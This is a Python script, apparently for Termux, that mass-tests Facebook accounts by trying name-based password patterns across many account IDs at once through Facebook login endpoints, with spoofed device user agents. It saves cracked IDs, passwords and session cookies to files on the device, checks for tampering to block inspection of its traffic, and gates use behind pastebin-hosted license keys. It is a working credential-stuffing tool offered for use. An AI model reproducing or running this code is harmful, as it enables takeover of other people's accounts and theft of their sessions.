import os
from os import system as sm
from time import sleep as sp
from concurrent.futures import ThreadPoolExecutor as ted
import uuid
import random 
import httpx
import string
import json
import sys
import base64
import requests
import time
import asyncio
import aiohttp
from rich import print as rprint
os.system('clear')
r="[bold red]"
g="[bold green]"
b="[bold blue]"
y="[bold yellow]"
m="[bold magenta]"
c="[bold cyan]"
w="[bold white]"
mods=[]
modss=httpx.get('https://raw.githubusercontent.com/pbakondy/android-device-list/master/devices.json').json()
models=modss
for x in models:
  if "SM-" in x['model'] or "CPH" in x['model']:
    mods.append(x['model'])
async def bypass():
  file = open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py','r')
  file2 = open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/sessions.py','r')
  file3 = open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py','r')
  data = file.read()
  sess = file2.read()
  approve = file3.read()
  keyword =("print(url)")
  keyword2 = ("print(data)")
  if keyword in data or "echo" in data or "pprint" in data:
    sm('clear')
    print(10*"\n\033[1;31mBYPASS???? HAHAHAHAHAHAHA NOOB")
    print("\n\033[1;33mBYE BYE FILES AHAHAHHAHA")
    exit()
  elif keyword in sess or "echo" in sess or keyword2 in sess or "pprint" in sess or "print(headers)" in sess or "{url}" in sess or "{data}" in sess or "{headers}" in sess or "Console" in sess or "rich" in sess or "exec" in sess or "sys.stdout.write" in sess:
    sm('clear')
    print(20*"\nCAPTURE DATA????? NOOB KID")
    print("\n\033[1;31mBYE BYE FILES")
    exit()
  else:
    await key()
#----------logo----------#
def logo():
      os.system('clear')
      rprint("""

              {}███████╗{}██╗  ██╗{} █████╗ {} █████╗
              {}██╔════╝{}╚██╗██╔╝{}██╔══██╗{}██╔══██╗
              {}█████╗{}   ╚███╔╝ {}██║  ╚═╝{}███████║
              {}██╔══╝{}   ██╔██╗ {}██║  ██╗{}██╔══██║
              {}███████╗{}██╔╝╚██╗{}╚█████╔╝{}██║  ██║
              {}╚══════╝{}╚═╝  ╚═╝{} ╚════╝ {}╚═╝  ╚═╝
{}[/]""".format(r,g,b,y,r,g,b,y,r,g,b,y,r,g,b,y,r,g,b,y,r,g,b,y,"[bold cyan]="*os.get_terminal_size().columns,"[bold cyan]="*os.get_terminal_size().columns))
#----------clear----------#
xy = requests.get('https://api.ipify.org/').text
os.system('clear')
print('\r\r\r\33[1;33m              YOUR IP:\33[1;32m'+str(xy))
time.sleep(5)
def clear():
    os.system('clear')
    logo()
    print(' \033[1;32mFB LINK : https://www.facebook.com/angbo.bomo.75 ')
    print(' GITHUB  : Scammur')
    print(' STATUS  : VIP(1.0)')
    print(' VERSION : VIP')
    print(' IP      : '+xy)
    print("\033[1;36m="*os.get_terminal_size().columns)

def line():
    print("\033[1;36m="*os.get_terminal_size().columns)

def main():
    clear()
    print(' [1] FILE CLONING ')
    print(' [0] EXIT ')
    line()
    try:
        option=input('  CHOICE MENU : ')
        if option in ['1','01']:
            file()
        else:
            exit(' THANKS FOR USING ')
    except ValueError:
        option = "A"
def file():
    clear()
    filex=input(' ENTER FILE PATH : ')
    try:
        fo=open(filex,'r').read().splitlines()
    except FileNotFoundError:
        print(' File not found !!');sp(2)
        file()
    except IsADirectoryError:
        print("\033[1;31mERROR!! THIS IS A FOLDER NOT A FILE!!")
        sp(3)
        file()
    clear()
    print("\r\033[1;36m CHOOSE METHOD\n\n [1] METHOD 1(slow)\n [2] METHOD 2(fast)")
    line()
    mthd = input('Select Method: ')
    clear()
    try:
        pas_limit=int(input(' [??] ENTER PASSWORD LIMIT (1-20) : '))
    except:
        pas_limit=1
    line()
    pas_list=[]
    for i in range(pas_limit):
        pasx=input(f' [??] ENTER PASSWORD {i+1} : ')
        pas_list.append(pasx)
    with ted(max_workers=30) as death:
        tl=str(len(fo))
        clear()
        print(' TOTAL ACCOUNT : '+tl)
        print(' USE AIRPLANE MODE FOR SPEED UP')
        line()
        print(' IDS & PASS & COOKIES SAVE IN\n /sdcard/DRAX-ALIVE.txt\n /sdcard/DRAX-COOKIES.txt')
        line()
        for user in fo:
            ids,names=user.split('|')
            passlist=pas_list
            if mthd == "1":
                death.submit(m1,ids,names,passlist)
            elif mthd == "2":
                death.submit(m2,ids,names,passlist)
            else:
                main()
    line()
    print(' THE PROCESS HAS BEEN COMPLETE')
    input(' PRESS ENTER TO BACK : ')
    main()
loop=0
oks=[]
cps=[]
#method
def m1(ids,names,passlist):
    global oks,loop
    try:
        fn=names.split(' ')[0]
        try:
            ln=names.split(' ')[1]
        except:
            ln=fn
        for pw in passlist:
            sys.stdout.write('\r\r\033[1;36m [PABLO ~ M1] %s| \033[1;32mALIVE\033[0m||\033[1;31mDEAD \033[1;32m%s\033[0m||\033[1;31m%s\033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
            pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            random_seed = random.Random()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            data={
              'adid': f'{uuid.uuid4()}', 
              'format': 'json', 
              'device_id': f'{uuid.uuid4()}', 
              'cpl': 'true', 
              'family_device_id': f'{uuid.uuid4()}', 
              'credentials_type': 'device_based_login_password', 
              'error_detail_type': 'button_with_disabled', 
              'source': 'device_based_login', 
              'email': ids, 
              'password': pas, 
              'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
              'generate_session_cookies': '1', 
              'meta_inf_fbmeta': '', 
              'advertiser_id': f'{uuid.uuid4()}', 
              'currently_logged_in_userid': '0', 
              'locale': 'en_US', 
              'client_country_code': 'US', 
              'method': 'auth.login', 
              'fb_api_req_friendly_name': 'authenticate', 
              'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 
              'api_key': f'882a8490361da98702bf97a021ddc14d',
              }
            qp1a=f"SP1A.{random.randint(200000,999999)}.{random.randint(100,999)}"
            buil=f"{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.randint(20,99)}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}"
            build=random.choice([qp1a,buil])
            fbbb=random.randint(100000000,300000000)
            fbpnnn=random.choice(['FB4A','Orca-Android','MessengerLite'])
            if fbpnnn == "FB4A":
              fbpnn="katana"
            elif fbpnnn == "Orca-Android":
              fbpnn="orca"
            elif fbpnnn == "MessengerLite":
              fbpnn="mlite"
            fbccr=random.choice(['GLOBE','TNT','SMART','TM'])
            modeld=random.choice(mods)
            headers={
                    'User-Agent': f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {modeld} Build/{qp1a}) '+'  [FBAN/FB4A;FBAV/64.0.0.4871;FBBV/31535647;[FBAN/FB4A;FBAV/230.0.0.5.128;FBBV/215407251;FBDM/{density=3.5,width=1080,height=1453};FBLC/en_US;FBRV/325.0.0.9.169;FBCR/Idea;FBMF/Asus;FBBD/Asus;FBPN/com.facebook.katana;FBDV/ZenFone 5Z;FBSV/12;FBOP/1;FBCA/arm64-v8a:]',
              'Content-Type': 'application/x-www-form-urlencoded', 
              'Host': 'graph.facebook.com', 
              'X-FB-Net-HNI': str(random.randint(30000,40000)), 
              'X-FB-SIM-HNI': str(random.randint(30000,40000)), 
              'X-FB-Connection-Type': 'MOBILE.LTE',
              'X-Tigon-Is-Retry': 'False',
              'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 
              'x-fb-device-group': str(random.randint(1000,9999)),
              'X-FB-Friendly-Name': 'ViewerReactionsMutation',  
              'X-FB-Request-Analytics-Tags': 'graphservice', 
              'X-FB-HTTP-Engine': 'Liger', 
              'X-FB-Client-IP': 'True', 
              'X-FB-Server-Cluster': 'True', 
              'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
            }
              
            url='https://graph.facebook.com/auth/login'
            req=requests.post(url,data=data,headers=headers).json()
            if 'session_key' in req:
                coki = ";".join(i["name"]+"="+i["value"] for i in req["session_cookies"])
                print('\r\r \033[1;32m[ALIVE] '+ids+'|'+pas)
                print('\r\r \033[1;33m[FB-LINK]\033[1;34m https://www.facebook.com/'+ids)
                print('\033[1;32m [COOKIES] \033[1;36m'+coki)
                open('/sdcard/DR4X-ALIVE.txt','a').write(ids+' ^ '+pas+'\n')
                open('/sdcard/DR4X-COOKIES.txt','a').write(ids+"|"+pas+"|"+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in req['error']['message']:
                #print('\r\r\033[1;31m [CHECKPOINT] '+ids+'|'+pas)
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
def m2(ids,names,passlist):
    global oks,loop
    try:
        fn=names.split(' ')[0]
        try:
            ln=names.split(' ')[1]
        except:
            ln=fn
        for pw in passlist:
            sys.stdout.write('\r\r\033[1;36m [PABLO ~ M2] %s| \033[1;32mALIVE\033[0m||\033[1;31mDEAD \033[1;32m%s\033[0m||\033[1;31m%s\033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
            pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            data={
              'adid': f'{uuid.uuid4()}', 
              'format': 'json', 
              'device_id': f'{uuid.uuid4()}', 
              'cpl': 'true', 
              'family_device_id': f'{uuid.uuid4()}', 
              'credentials_type': 'device_based_login_password', 
              'error_detail_type': 'button_with_disabled', 
              'source': 'device_based_login', 
              'email': ids, 
              'password': pas, 
              'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
              'generate_session_cookies': '1', 
              'meta_inf_fbmeta': '', 
              'advertiser_id': f'{uuid.uuid4()}', 
              'currently_logged_in_userid': '0', 
              'locale': 'en_US', 
              'client_country_code': '', 
              'method': 'auth.login', 
              'fb_api_req_friendly_name': 'authenticate', 
              'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 
              'api_key': f'62f8ce9f74b12f84c123cc23437a4a32'
              
            }
            build=f"{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.randint(10,99)}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}"
            fbbb = random.randint(200000000,300000000)
            fbob = random.randint(200000000,300000000)
            qp1a = f"QP1A.{random.randint(100000,200000)}.0{random.randint(10,25)}"
            fbpnnn=random.choice(['FB4A','Orca-Android','MessengerLite'])
            if fbpnnn == "FB4A":
              fbpnn="katana"
            elif fbpnnn == "Orca-Android":
              fbpnn="orca"
            elif fbpnnn == "MessengerLite":
              fbpnn="mlite"
            builld = random.choice([build,qp1a])
            fbccr=random.choice(['ZONG','Jazz'])
            headers={
                    'User-Agent': f"[FBAN/FB4A;FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)};FBBV/{random.randint(20000000,80000000)};[FBAN/{fbpnnn};FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)}"+";FBBV/2"+str(random.randint(1000000,9999999))+";FBDM/{density=2.3,width=1080,height=1418};FBLC/en_US;FBRV/257.0.0.3.110;FBCR/ZONG;FBMF/Asus;FBBD/Asus;FBPN/com.facebook.%s;FBDV/ZenFone 7;FBSV/9;FBOP/1;FBCA/arm64-v8a:]"%(fbpnn)+f" [FBAN/FB4A;FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)};FBBV/{random.randint(20000000,99999999)};[FBAN/{fbpnnn};FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)}"+";FBBV/2"+str(random.randint(10000000,99999999))+";FBDM/{density=3.5,width=1080,height=1466};FBLC/en_US;FBRV/397.0.0.1.153;FBCR/Jazz;FBMF/Tecno;FBBD/Tecno;FBPN/com.facebook.%s;FBDV/Camon X;FBSV/9;FBOP/1;FBCA/arm64-v8a:]"%(fbpnn)+f" [FBAN/FB4A;FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)};FBBV/{random.randint(20000000,99999999)};[FBAN/{fbpnnn};FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)}"+";FBBV/2"+str(random.randint(1000000,9999999))+";FBDM/{density=3.3,width=1080,height=1429};FBLC/en_US;FBRV/320.0.0.2.153;FBCR/ZONG;FBMF/Asus;FBBD/Asus;FBPN/com.facebook.%s;FBDV/ZenFone Selfie;FBSV/12;FBOP/1;FBCA/arm64-v8a:]"%(fbpnn),
              'Content-Type': 'application/x-www-form-urlencoded', 
              'Host': 'graph.facebook.com', 
              'X-FB-Net-HNI': str(random.randint(10000,99999)), 
              'X-FB-SIM-HNI': str(random.randint(10000,99999)), 
              'X-FB-Connection-Type': 'MOBILE.LTE',
              'X-Tigon-Is-Retry': 'False',
              'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 
              'x-fb-device-group': str(random.randint(1000,9999)),
              'X-FB-Friendly-Name': 'ViewerReactionsMutation',  
              'X-FB-Request-Analytics-Tags': 'graphservice', 
              'X-FB-HTTP-Engine': 'Liger', 
              'X-FB-Client-IP': 'True', 
              'X-FB-Server-Cluster': 'True', 
              'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',
              
            }
            url='https://b-graph.facebook.com/auth/login'
            req=requests.post(url,data=data,headers=headers).json()
            if 'session_key' in req:
                coki = ";".join(i["name"]+"="+i["value"] for i in req["session_cookies"])
                print('\r\r \033[1;32m[ALIVE] '+ids+'|'+pas)
                print('\r\r \033[1;33m[FB-LINK] \033[1;34mhttps://www.facebook.com/'+ids)
                print('\033[1;32m [COOKIES] \033[1;36m'+coki)
                open('/sdcard/DR4X-ALIVE.txt','a').write(ids+' ^ '+pas+'\n')
                open('/sdcard/DRAX-COOKIES.txt','a').write(ids+" >> "+pas+" >> "+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in req['error']['message']:
                #print('\r\r\033[1;31m [CHECKPOINT] '+ids+'|'+pas)
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
def m3(ids,names,passlist):
    try:
        global oks,cps,loop
        sys.stdout.write('\r\r\033[1;37m EXC4 M2\033[1;35m｟\033[1;37m%s\033[1;35m｠\033[1;32mOK:-%s \033[1;31mCP:-%s\033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln=names.split(' ')[1]
        except:
            ln=fn
        for pw in passlist:
            pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            random_seed = random.Random()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            device_id = str(uuid.uuid4())
            data = {
                    'adid':adid,
                    'format':'json',
                    'device_id':device_id,
                    'email':ids,
                    'password':pas,
                    "session_id": str(uuid.uuid4()),
                    "advertiser_id": str(uuid.uuid4()),
                    "reg_instance": str(uuid.uuid4()),
                    "logged_out_id": str(uuid.uuid4()),
                    "hash_id": str(uuid.uuid4()),
                    "sim_country": "us",
                    "network_country": "us",
                    "enroll_misauth": "false",
                    'generate_analytics_claims':'1',
                    'credentials_type':'password',
                    'source':'login',
                    'error_detail_type':'button_with_disabled',
                    'enroll_misauth':'false',
                    "cpl": "true",
                    'generate_session_cookies':'1',
                    'generate_machine_id':'1',
                    'meta_inf_fbmeta':'',
                    'currently_logged_in_userid':'0',
                    'fb_api_req_friendly_name':'authenticate',
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    }
            fbpnnn=random.choice(['FB4A','Orca-Android','MessengerLite'])
            if fbpnnn == "FB4A":
                fbpnn="katana"
            elif fbpnnn == "Orca-Android":
                fbpnn="orca"
            elif fbpnnn == "MessengerLite":
                fbpnn="mlite"
            else:
                fbpnn=""
            headers={
                    'Authorization':f'OAuth {accessToken}',
                    "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                    "X-FB-Net-HNI": str(random.randint(900000, 999999)),
                    "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                    'X-FB-Friendly-Name':'authenticate',
                    'X-FB-Connection-Type':'unknown',
                    'User-Agent': f"[FBAN/FB4A;FBAV/"+str(random.randrange(60,405))+".0.0."+str(random.randint(10,20))+"."+str(random.randint(80,150))+";FBBV/"+str(random.randint(20000000,80000000))+f";[FBAN/{fbpnnn};FBAV/"+str(random.randrange(80,405))+".0.0."+str(random.randint(10,20))+"."+str(random.randint(80,150))+";FBBV/2"+str(random.randrange(1000000,9999999))+";FBDM/{density=4.0,width=1440,height=2392};FBLC/en_US;FBCR/TNT;FBMF/LGE;FBBD/lge;FBPN/com.facebook."+fbpnn+";FBDV/LG-D852;FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;] [FBAN/FB4A;FBAV/"+str(random.randrange(60,405))+".0.0."+str(random.randint(10,20))+"."+str(random.randint(80,150))+";FBBV/"+str(random.randint(20000000,80000000))+f";[FBAN/{fbpnnn};FBAV/"+str(random.randrange(80,405))+".0.0."+str(random.randint(10,20))+"."+str(random.randint(80,150))+";FBBV/2"+str(random.randrange(1000000,9999999))+";FBDM/{density=4.0,width=1440,height=2392};FBLC/en_US;FBCR/SMART;FBMF/LGE;FBBD/lge;FBPN/com.facebook."+fbpnn+";FBDV/LG-D852;FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;] [FBAN/FB4A;FBAV/"+str(random.randrange(60,405))+".0.0."+str(random.randint(10,20))+"."+str(random.randint(80,150))+";FBBV/"+str(random.randint(20000000,80000000))+";[FBAN/"+fbpnnn+";FBAV/"+str(random.randrange(80,405))+".0.0."+str(random.randint(10,20))+"."+str(random.randint(80,150))+";FBBV/2"+str(random.randrange(1000000,9999999))+";FBDM/{density=4.0,width=1440,height=2392};FBLC/en_US;FBCR/TNT;FBMF/LGE;FBBD/lge;FBPN/com.facebook."+fbpnn+";FBDV/LG-D852;FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;]",
                    'Accept-Encoding':'gzip, deflate',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-FB-HTTP-Engine': 'Liger'
                    }
            url = 'https://api.facebook.com/method/auth.login'
            twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
            po = requests.post(url,data=data,headers=headers,allow_redirects=False).json()
            if 'session_key' in po:
                coki = ";".join(i["name"]+"="+i["value"] for i in req["session_cookies"])
                print('\r\r \033[1;32m[ALIVE] '+ids+'|'+pas)
                print('\r\r \033[1;33m[FB-LINK]\033[1;34m https://www.facebook.com/'+ids)
                print('\033[1;32m [COOKIES] \033[1;36m'+coki)
                open('/sdcard/DR4X-ALIVE.txt','a').write(ids+' ^ '+pas+'\n')
                open('/sdcard/DR4X-COOKIES.txt','a').write(ids+"|"+pa+"|"+coki)
                oks.append(ids)
                break
            elif 'www.facebook.com' in req['error']['message']:
                #print('\r\r\033[1;31m [CHECKPOINT] '+ids+'|'+pas)
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
async def login():
  check=requests.get("https://pastebin.com/raw/Nr9LuZ4u").text
  clear()
  logo()
  login=input("\033[1;36mEnter Your Username: \033[1;31m")
  if login == "mrdeath":
    await main()
  elif login == "kiru":
    await bypass()
  elif login == "pablo":
    await bypass()
  else:
    sys.exit()
#key
ah="xD4RK-"
imt="-M4786=="
ak=" DR4X-"
myid=uuid.uuid4().hex[:10].upper()

try:
  key1=open('/data/data/com.termux/files/usr/bin/vip.txt', 'r').read()
except:
  kok=open('/data/data/com.termux/files/usr/bin/vip.txt', 'w')
  kok.write(myid+imt)
  kok.close()
async def key():
  #r1=str(urlopen("https://pastebin.com/raw/zg0D9N7Y").read())
  key1=open('/data/data/com.termux/files/usr/bin/vip.txt', 'r').read()
  clear()
  logo()
  async with aiohttp.ClientSession() as sess:
    async with sess.get('https://pastebin.com/raw/hnHX2J8B') as appro:
      r1 = await appro.text()
      if key1 in r1:
        os.system('clear')
        print("\033[1;32mYour Key Is Approved[/]")
        sp(3)
        main()
      else:
        clear()
        print("\t \033[1;32m First Get Approval\033[1;37m ")
        time.sleep(5)
        clear()
        print ("")
        print(" YOU HAVE TO GET APPROVE FIRST BEFORE USING IT")
        print ("")
        print(" Your Key is Not Approved ")
        print("")
        print (" Your Key : "+ak+ah+key1 )
        print ("")
        input(" Press Enter To Send Key")
        time.sleep(3.5)
        os.system('xdg-open https://www.messenger.com/t/100065316414713') 

#--end--
#
asyncio.run(login())
#main()
